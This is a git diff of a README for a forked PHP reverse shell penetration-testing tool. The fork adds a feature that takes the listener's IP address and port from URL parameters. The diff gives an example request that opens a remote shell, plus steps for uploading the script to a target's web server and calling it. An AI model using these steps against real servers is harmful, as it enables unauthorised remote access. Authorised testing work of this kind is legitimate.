@@ -1,6 +1,12 @@
 # PHP Reverse Shell
 
-Just a little refresh on the popular PHP reverse shell script [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell). Credits to the original author!
+This is an adaptation of the PHP reverse shell that was created by [ivan-sincek](https://github.com/ivan-sincek/php-reverse-shell/) that he based on the popular PHP reverse shell script by [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell). Credits to the original author!
+
+It has been updated to allow a user to input the IP address of the machine that is attempting to gain access to the reverse shell and the port that it will listen on as parameters in the URL. So the URL would look like:
+
+```
+http://192.168.1.1/php_reverse_shell.php?addr=192.168.1.20&port=9000
+```
 
 Works on Linux OS and macOS with `/bin/sh` and Windows OS with `cmd.exe`. Script will automatically detect an underlying OS.
 
@@ -20,15 +26,17 @@ Made for educational purposes. I hope it will help!
 
 ## How to Run
 
-[/src/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php) requires PHP v5.0.0 or greater, mainly because `proc_get_status()` is used.
+[/src/php_reverse_shell.php](https://github.com/srichs/php-reverse-shell/blob/master/src/php_reverse_shell.php) requires PHP v5.0.0 or greater, mainly because `proc_get_status()` is used.
 
-[/src/php_reverse_shell_older.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell_older.php) requires PHP v4.3.0 or greater.
+[/src/php_reverse_shell_older.php](https://github.com/srichs/php-reverse-shell/blob/master/src/php_reverse_shell_older.php) requires PHP v4.3.0 or greater.
 
-**Change the IP address and port number inside the scripts as necessary.**
+Copy [/src/php_reverse_shell.php](https://github.com/srichs/php-reverse-shell/blob/master/src/php_reverse_shell.php) to your server's web root directory (e.g. to /opt/lampp/htdocs/ on XAMPP) or upload it to your target's web server.
 
-Copy [/src/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php) to your server's web root directory (e.g. to /opt/lampp/htdocs/ on XAMPP) or upload it to your target's web server.
+Navigate to the file with your preferred web browser entering the parameters in the URL.
 
-Navigate to the file with your preferred web browser.
+```
+http://192.168.1.1/php_reverse_shell.php?addr=192.168.1.20&port=9000
+```
 
 ---
 
